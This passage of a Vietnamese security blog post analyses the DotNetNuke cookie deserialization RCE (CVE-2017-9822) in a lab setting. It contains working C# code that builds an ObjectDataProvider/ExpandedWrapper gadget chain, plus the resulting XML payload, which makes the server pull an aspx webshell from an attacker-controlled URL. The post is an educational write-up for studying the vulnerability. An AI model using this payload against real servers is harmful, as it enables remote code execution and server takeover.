</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Ở method <code>DeSerialize</code> dựa vào <code>XmlUtils#DeSerializeHashtable</code> mình chỉ sửa lại value trả về là <code>void</code> thay vì <code>hashtable</code> và method <code>Serialize</code> serialize thành xml string đúng format để <code>DeSerialize</code> có thể deserialize được.</p>
<p>Result sau khi chạy, file <code>obj.xml</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;profile&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;item</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;example.Test, serialization, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;Test</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&lt;name&gt;</span>ahihi ahuhu<span style="color:#f92672">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;/Test&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;/item&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/profile&gt;</span>
</span></span></code></pre></div><p>console:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/console.png" alt="console"></p>
<p>Có thể thấy rằng setter method(property) đã được gọi tận 2 lần, lần lượt khi thực hiện serialize và deserialize. Lợi dụng cơ chế invoke setter method này khi deserialization attacker có thể trigger thực thi các đoạn mã khác theo ý muốn như thực thi OS command. Ví dụ ta sửa đổi class <code>Test</code> thành như sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">string</span> _name;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> name
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">get</span> { <span style="color:#66d9ef">return</span> _name; }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">set</span> { <span style="color:#66d9ef">this</span>._name = <span style="color:#66d9ef">value</span>; execCMD(); }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> execCMD()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        Process process = <span style="color:#66d9ef">new</span> Process();
</span></span><span style="display:flex;"><span>        process.StartInfo.FileName = <span style="color:#66d9ef">this</span>._name;
</span></span><span style="display:flex;"><span>        process.Start();
</span></span><span style="display:flex;"><span>        process.Dispose(); <span style="color:#75715e">// close</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Với name truyền vào là command <code>calc.exe</code> ta trigger pop up windows calculator ngay khi objec được deserialize:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/popup_demo.png" alt="popup_demo"></p>
<p>file <code>obj.xml</code> cũng không thay đổi nhiều:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;profile&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;item</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;example.Test, serialization, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;Test</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&lt;name&gt;</span>calc.exe<span style="color:#f92672">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;/Test&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;/item&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/profile&gt;</span>
</span></span></code></pre></div><p>Nghịch thể đủ rồi, trở lại với <em>XmlSerializer</em> trong <em>DotNetNuke</em>, bây giờ làm sao để thực thi OS command từ lỗ hổng này bởi ta đương nhiên không thể tự chèn class như ví dụ trên trong runtime.</p>
<h4 id="from-xml-insecure-deserialization-to-rce">From xml insecure deserialization to RCE</h4>
<p>Mục tiêu bây giờ là cần tìm object có thể execute code khi thực hiện deserialize, cùng xem qua một số options.</p>
<h5 id="filesystemutils-pullfile-method">FileSystemUtils PullFile method</h5>
<p><code>DotNetNuke.dll</code> assembly có class <em>FileSystemUtils</em> implements method <code>PullFile</code>:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/PullFile.png" alt="PullFile"></p>
<p>Method này đặc biệt hữu dụng bởi nếu ta có thể gọi đến method này thì có thể download file bất kì về server từ <code>URL</code> string và lưu vào <code>FilePath</code> bất kì. Do vậy nếu ta deserialize <code>DNNPersonalization</code> cookies và tải về DNN một <code>aspx</code> webshell vào webroot thì có thể RCE được.</p>
<p>Tuy nhiên như đã đề cập từ trước, <em>XmlSerializer</em> không  thể serialize class method mà chỉ là các trường và thuộc tính public. Các trường và thuộc tính public của class <em>FileSystemUtils</em> thì cũng không có cái nào có thể gọi đến được method <em>PullFile</em>. Do đó, serialize instance của object này không có tác dụng gì.</p>
<h5 id="objectdataprovider-class">ObjectDataProvider Class</h5>
<p>Việc exploit deser ở .NET với gadget chain có sẵn cũng được public khá nhiều. <em>ObjectDataProvider</em> gadget có thể nói là chain phổ biến cũng như hữu dụng nhất được trình bày tại <code>BlackHat US 2017 - Friday the 13th JSON Attacks</code>, cùng tìm hiểu kĩ hơn về class này.</p>
<p>Theo documentation chính thức, <em>ObjectDataProvider</em> class được sử dụng khi ta muốn wrap một object khác trong <em>ObjectDataProvider</em> instance và sử dụng nó như binding source. Binding source đơn giản là một object cung cấp programer các dữ liệu có liên quan. Dữ liệu này liên kết từ source đến targer object như <em>UserInterface</em> để hiện thị dữ liệu đó.</p>
<p><em>ObjectDataProvider</em> hữu ích khi nó cho phép wrap arbitrary object và sử dụng thuộc tính <em>MethodName</em> để gọi một method từ wrapped object, cùng với đó là thuộc tính <em>MethodParameters</em> để truyền các các parameter cần thiết vào <em>MethodName</em>. Do vậy nhờ <em>ObjectDataProvider</em> ta có thể gọi đến method thuộc object bất kì ở trong runtime. Hơn cả, class này không bị giới hạn serialize bởi <em>XmlSerializer</em> do đó là ứng viên sáng giá để build payload exploit lổ hổng này.</p>
<p>Cùng xem kĩ hơn <em>ObjectDataProvider</em> như nào. Class này được định nghĩa và implemented trong namespace <code>System.Windows.Data</code>, nó nằm ở module <code>PresentationFramework.dll</code>. Trong windows có thể tồn tại một hoặc nhiều file này phụ thuộc vào số .NET framework version được cài đặt. Ở đây mình sẽ chọn ở directory: <code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF</code></p>
<p>ObjectDataProvider <code>MethodName</code> property
<img src="/images/2023/DotNetNuke_CVE-2017-9822/MethodName.png" alt="MethodName"></p>
<p>Khi setter được gọi sẽ gọi tiếp đến <code> DataSourceProvider#Refresh()</code>:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/Refresh.png" alt="Refresh"></p>
<p>Tiếp tục theo luồng <code>DataSourceProvider#BeginQuery</code>:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/BeginQuery.png" alt="BeginQuery"></p>
<p>Tưởng như tới đây chẳng còn gì nhưng cần lưu ý rằng <em>ObjectDataProvider</em> thừa kế từ <em>DataSourceProvider</em> nơi dnSpy trace tới. Ta cần chú ý xem đúng method mà <em>ObjectDataProvider</em> đã override.</p>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/BeginQuery_impl.png" alt="BeginQuery_impl"></p>
<p>Yeah, trace tiếp đến <code>QueryWorker</code>
<img src="/images/2023/DotNetNuke_CVE-2017-9822/QueryWorker.png" alt="QueryWorker"></p>
<p>Và tại đây, method <code>InvokeMethodOnInstance</code> sẽ được gọi, nơi nó sẽ invoke wrapped object method:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/InvokeMethodOnInstance.png" alt="InvokeMethodOnInstance"></p>
<p>Vậy khi setter method của trường <em>MethodName</em> thuộc class <em>ObjectDataProvider</em> được gọi, nó cũng đồng thời invoke method vừa được gán.</p>
<h5 id="is-that-enough-lets-build-the-final-payload">Is that enough, let&rsquo;s build the final payload</h5>
<p>Mình sẽ sử dụng IDE jetbrain rider để viết script, cần reference đến <code>DotNetNuke.dll</code> và <code>PresentationFramework.dll</code> module.
<img src="/images/2023/DotNetNuke_CVE-2017-9822/jetbrain.png" alt="jetbrain"></p>
<p>Dùng <em>ObjectDataProvider</em> wrap <code>FileSystemUtils#PullFile</code> và serialize - deserialize như sau:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/wrap_PullFile.png" alt="wrap_PullFile"></p>
<p>Tuy nhiên khi thực hiện serialize thì bị lỗi:
<img src="/images/2023/DotNetNuke_CVE-2017-9822/error_wrap.png" alt="error_wrap"></p>
<p>Lỗi này là do cách <em>XmlSerializer</em> được khởi tạo. Ở method Serialize, với loại object truyền vào là bất kì, method sẽ lấy object type qua method <code>GetType()</code> để khởi tạo <em>XmlSerialier</em>. Ở trường hợp này ta truyền vào <em>ObjectDataProvider</em>, cái <em>XmlSerializer</em> expected, tuy nhiên nó không hề biết loại object được wrap bởi <em>ObjectDataProvider</em> chính là <em>FileSystemUtils</em> là gì, do đó nó báo lỗi không &ldquo;expected&rdquo; class này. Do đó thực hiện serialize thất bại.</p>
<p>Thật ra ta có thể fix lỗi này bằng cách sử dụng constructor khác của <em>XmlSerializer</em> như sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>XmlSerializer xmlSerializer = <span style="color:#66d9ef">new</span> XmlSerializer(objectDataProvider.GetType(), <span style="color:#66d9ef">new</span> Type[]
</span></span><span style="display:flex;"><span>{<span style="color:#66d9ef">typeof</span>(FileSystemUtils)});
</span></span></code></pre></div><p><em>Chỉ cho XmlSerializer loại object được wrapped</em></p>
<p>Tuy nhiên <em>XmlSerializer</em> trong <em>DNN</em> sử dụng default constructor do đó ta không thể dùng cách này.</p>
<h5 id="expandedwrapper-class-come-to-play">ExpandedWrapper Class come to play</h5>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/yugioh.jpg" alt="yugioh"></p>
<p>Theo official documentation của ExpandedWrapper Class:</p>
<p><code>This class is used internally by the system to implement support for queries with eager loading of related entities. This API supports the product infrastructure and is not intended to be used directly from your code</code></p>
<p>Nói đơn giản là class này được dùng internal cho các product chứ không sinh ra để dev sử dụng. Nói ngắn chọn chức năng của class này lạ transform một object nhất định sang dạng một object khác.</p>
<p><em>ExpandedWrapper</em> class có thể dùng để đóng gói(encapsulation) arbitrary object type. Hơn cả, constructor của class này cho phép chỉ định các loại object được đóng gói ở instance hiện tại. Đây chính xác là cái ta cần để <em>XmlSeralier</em> có thể hiểu và serialize được, khắc phục vấn đề ta gặp trước đó ở trên. Class này cũng thỏa mãn các điều kiện của <em>XmlSerializer</em> để có thể được serialize.</p>
<p>Ta đóng gói <em>ObjectDataProvider</em>, <em>FileSystemUtil</em> và serialize như sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Windows.Data;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> DotNetNuke.Common.Utilities;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Data.Services.Internal;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Xml;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Xml.Serialization;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> example
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> fileFolder = <span style="color:#e6db74">&#34;D:\\lab\\csharp\\DNN\\serialization\\&#34;</span>; <span style="color:#75715e">// CHANGE THIS</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Serialize(Object obj) <span style="color:#75715e">// method xml serialize arbitrary object </span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// tạo xml root element</span>
</span></span><span style="display:flex;"><span>            XmlDocument xmlDocument = <span style="color:#66d9ef">new</span> XmlDocument();
</span></span><span style="display:flex;"><span>            XmlElement xmlElementRoot = xmlDocument.CreateElement(<span style="color:#e6db74">&#34;profile&#34;</span>);
</span></span><span style="display:flex;"><span>            xmlDocument.AppendChild(xmlElementRoot);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// tạo node con item có attribute type chứa tên object type</span>
</span></span><span style="display:flex;"><span>            XmlElement xmlElementItem = xmlDocument.CreateElement(<span style="color:#e6db74">&#34;item&#34;</span>);
</span></span><span style="display:flex;"><span>            xmlElementItem.SetAttribute(<span style="color:#e6db74">&#34;type&#34;</span>, obj.GetType().AssemblyQualifiedName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// serialize obj thành xmlDocumentObj</span>
</span></span><span style="display:flex;"><span>            XmlDocument xmlDocumentObj = <span style="color:#66d9ef">new</span> XmlDocument();
</span></span><span style="display:flex;"><span>            XmlSerializer xmlSerializer = <span style="color:#66d9ef">new</span> XmlSerializer(obj.GetType());
</span></span><span style="display:flex;"><span>            StringWriter stringWriter = <span style="color:#66d9ef">new</span> StringWriter();
</span></span><span style="display:flex;"><span>            xmlSerializer.Serialize(stringWriter, obj);
</span></span><span style="display:flex;"><span>            xmlDocumentObj.LoadXml(stringWriter.ToString());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// thêm xml serialized object này vào node item và thêm node item vào root element</span>
</span></span><span style="display:flex;"><span>            xmlElementItem.AppendChild(xmlDocument.ImportNode(xmlDocumentObj.DocumentElement, <span style="color:#66d9ef">true</span>));
</span></span><span style="display:flex;"><span>            xmlElementRoot.AppendChild(xmlElementItem);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            File.WriteAllText(fileFolder + <span style="color:#e6db74">&#34;obj.xml&#34;</span>, xmlDocument.OuterXml);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> DeSerialize(<span style="color:#66d9ef">string</span> xmlSource, <span style="color:#66d9ef">string</span> rootname)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Hashtable hashtable = new Hashtable();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">string</span>.IsNullOrEmpty(xmlSource))
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    XmlDocument xmlDocument = <span style="color:#66d9ef">new</span> XmlDocument();
</span></span><span style="display:flex;"><span>                    xmlDocument.LoadXml(xmlSource);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">object</span> obj <span style="color:#66d9ef">in</span> xmlDocument.SelectNodes(rootname + <span style="color:#e6db74">&#34;/item&#34;</span>))
</span></span><span style="display:flex;"><span>                    {
</span></span><span style="display:flex;"><span>                        XmlElement xmlElement = (XmlElement)obj;
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">string</span> attribute = xmlElement.GetAttribute(<span style="color:#e6db74">&#34;key&#34;</span>);
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">string</span> attribute2 = xmlElement.GetAttribute(<span style="color:#e6db74">&#34;type&#34;</span>);
</span></span><span style="display:flex;"><span>                        XmlSerializer xmlSerializer = <span style="color:#66d9ef">new</span> XmlSerializer(Type.GetType(attribute2));
</span></span><span style="display:flex;"><span>                        XmlTextReader xmlReader = <span style="color:#66d9ef">new</span> XmlTextReader(<span style="color:#66d9ef">new</span> StringReader(xmlElement.InnerXml));
</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// hashtable.Add(attribute, xmlSerializer.Deserialize(xmlReader));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// custom</span>
</span></span><span style="display:flex;"><span>                        Object objResult = xmlSerializer.Deserialize(xmlReader);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">catch</span> (Exception)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// return hashtable;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            ExpandedWrapper&lt;FileSystemUtils, ObjectDataProvider&gt; expandedWrapper = <span style="color:#66d9ef">new</span> ExpandedWrapper&lt;FileSystemUtils, ObjectDataProvider&gt;();
</span></span><span style="display:flex;"><span>            expandedWrapper.ProjectedProperty0 = <span style="color:#66d9ef">new</span> ObjectDataProvider();
</span></span><span style="display:flex;"><span>            expandedWrapper.ProjectedProperty0.ObjectInstance = <span style="color:#66d9ef">new</span> FileSystemUtils();
</span></span><span style="display:flex;"><span>            expandedWrapper.ProjectedProperty0.MethodName = <span style="color:#e6db74">&#34;PullFile&#34;</span>;
</span></span><span style="display:flex;"><span>            expandedWrapper.ProjectedProperty0.MethodParameters.Add(<span style="color:#e6db74">&#34;https://7a1f-42-118-71-20.ap.ngrok.io/cmd.aspx&#34;</span>);
</span></span><span style="display:flex;"><span>            expandedWrapper.ProjectedProperty0.MethodParameters.Add(<span style="color:#e6db74">&#34;D:\\lab\\csharp\\DNN\\cmd.aspx&#34;</span>);
</span></span><span style="display:flex;"><span>            Console.WriteLine(<span style="color:#e6db74">&#34;Done!!&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Serialize(expandedWrapper);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// String xmlSource = File.ReadAllText(fileFolder + &#34;obj.xml&#34;);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// DeSerialize(xmlSource, &#34;profile&#34;);</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Ta được <code>obj.xml</code>: //</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;profile&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;item</span> <span style="color:#a6e22e">key=</span><span style="color:#e6db74">&#34;myTableEntry&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral,PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework,Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral,PublicKeyToken=b77a5c561934e089&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;ExpandedWrapperOfFileSystemUtilsObjectDataProvider</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&lt;ProjectedProperty0&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#f92672">&lt;ObjectInstance</span> <span style="color:#a6e22e">xsi:type=</span><span style="color:#e6db74">&#34;FileSystemUtils&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#f92672">&lt;MethodName&gt;</span>PullFile<span style="color:#f92672">&lt;/MethodName&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#f92672">&lt;MethodParameters&gt;</span>
</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&lt;anyType</span> <span style="color:#a6e22e">xsi:type=</span><span style="color:#e6db74">&#34;xsd:string&#34;</span><span style="color:#f92672">&gt;</span>http://192.168.0.108:7878/cmd.aspx<span style="color:#f92672">&lt;/anyType&gt;</span>
</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&lt;anyType</span> <span style="color:#a6e22e">xsi:type=</span><span style="color:#e6db74">&#34;xsd:string&#34;</span><span style="color:#f92672">&gt;</span>D:/lab/csharp/DNN/dotnetnuke/js/cmd.aspx<span style="color:#f92672">&lt;/anyType&gt;</span>
</span></span><span style="display:flex;"><span>				<span style="color:#f92672">&lt;/MethodParameters&gt;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">&lt;/ProjectedProperty0&gt;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;/ExpandedWrapperOfFileSystemUtilsObjectDataProvider&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&lt;/item&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/profile&gt;</span>
</span></span></code></pre></div><p>Tại đây nếu payload lỗi có thể dùng dnSpy debug để fix một số lỗi nhỏ. Nếu build bằng IDE jetbrain rider lỗi, có thể chuyển qua <em>Visual Studio 2019</em> để build bởi thường nó sẽ tương thích hơn!</p>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/req_exploit.png" alt="req_exploit">
<em>Gửi request</em></p>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/received_log.png" alt="received_log">
<em>Sau khi DNN deserialize cookies, tại http server có request đến /cmd.aspx tức deser thành công, webshell đã được upload lên DNN</em></p>
<p><img src="/images/2023/DotNetNuke_CVE-2017-9822/exec_cmd.png" alt="exec_cmd">
<em>aspx webshell</em></p>
<p>Thay vì tự viết payload như trên, ta hoàn toàn có thể generate lại payload exploit DNN bằng <code>ysoserial.net</code> đã được publish trên github.</p>
<h2 id="the-patch-and-bypass">The patch and bypass</h2>
<ul>
<li>CVE-2018-15811 : DotNetNuke 9.1.1</li>
<li>CVE-2018-15812 : DotNetNuke 9.2 through 9.2.1</li>
<li>CVE-2018-18325 and CVE-2018-18326 : DotNetNuke 9.2.2 through 9.3.0-RC</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</a></li>
<li><a href="https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization">https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization</a></li>
</ul>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Archives</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#build-lab">Build lab</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#sink-of-the-bug">Sink of the bug</a></li>
        <li><a href="#debugging">Debugging</a></li>
        <li><a href="#sink-to-the-source">Sink to the source</a></li>
        <li><a href="#build-payload">Build payload</a></li>
      </ul>
    </li>
    <li><a href="#the-patch-and-bypass">The patch and bypass</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&text=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&is_video=false&description=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fdotnetnuke_cve-2017-9822%2f&title=T%c3%acm%20hi%e1%bb%83u%20CVE-2017-9822%20-%20DotNetNuke%20Cookie%20Deserialization%20RCE" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
